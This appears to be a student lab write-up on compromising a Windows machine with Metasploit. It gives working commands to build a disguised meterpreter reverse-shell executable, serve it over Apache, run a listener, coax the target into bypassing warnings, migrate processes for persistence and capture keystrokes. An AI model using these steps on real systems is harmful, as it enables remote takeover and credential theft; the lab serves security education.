# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands
### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:
![Screenshot 2024-04-16 143132](https://github.com/yashvanthbalaji/ARP-Attack-and-Network-Sniffing/assets/145736316/4d4c2bdc-8010-4100-951a-120d3184e5e5)
Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT

![Screenshot 2024-04-16 143439](https://github.com/yashvanthbalaji/ARP-Attack-and-Network-Sniffing/assets/145736316/d0f639d2-2850-4e5e-9328-113264e87b78)
copy the fun.exe into the apache /var/www/html folder

![Screenshot 2024-04-16 143448](https://github.com/yashvanthbalaji/ARP-Attack-and-Network-Sniffing/assets/145736316/94ae47a7-e701-4268-9385-d988e23fa585)

Start apache server
sudo systemctl apache2 start

![Screenshot 2024-04-16 143511](https://github.com/yashvanthbalaji/ARP-Attack-and-Network-Sniffing/assets/145736316/e3b8c970-b38b-4098-a82d-caa5ba46abdd)

Check the status of apache2
![Screenshot 2024-04-16 143554](https://github.com/yashvanthbalaji/ARP-Attack-and-Network-Sniffing/assets/145736316/ffa96c91-8153-49c6-9937-33f9b8dd0048)

Invoke msfconsole:
![Screenshot 2024-04-16 143610](https://github.com/yashvanthbalaji/ARP-Attack-and-Network-Sniffing/assets/145736316/cd45f94b-239c-4bde-a42e-e67077a95dfe)

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
![Screenshot 2024-04-16 143844](https://github.com/yashvanthbalaji/ARP-Attack-and-Network-Sniffing/assets/145736316/ca71be7e-50d1-4a46-91d4-f3132583263b)
exploit
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![Screenshot 2024-04-27 165657](https://github.com/Vinothini1711/Compromising-windows-using-Metasploit/assets/144300204/7713228b-8b81-4617-8220-2e8e70656941)
Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
![Screenshot 2024-04-27 165646](https://github.com/Vinothini1711/Compromising-windows-using-Metasploit/assets/144300204/eb77c75b-4ab0-4d9f-951a-77d47620cf28)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

![Screenshot 2024-04-27 165637](https://github.com/Vinothini1711/Compromising-windows-using-Metasploit/assets/144300204/f8c81137-6147-4750-b24c-5d8b1fd0d8b4)

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![Screenshot 2024-04-27 165618](https://github.com/Vinothini1711/Compromising-windows-using-Metasploit/assets/144300204/fd97b96a-0ad7-4410-baf6-3fbc90790668)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

keyscan_dump	Shows the keystrokes captured so far

![Screenshot 2024-04-27 165630](https://github.com/Vinothini1711/Compromising-windows-using-Metasploit/assets/144300204/09a0627b-9c03-48f2-bdeb-667bd44c3be0)
## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
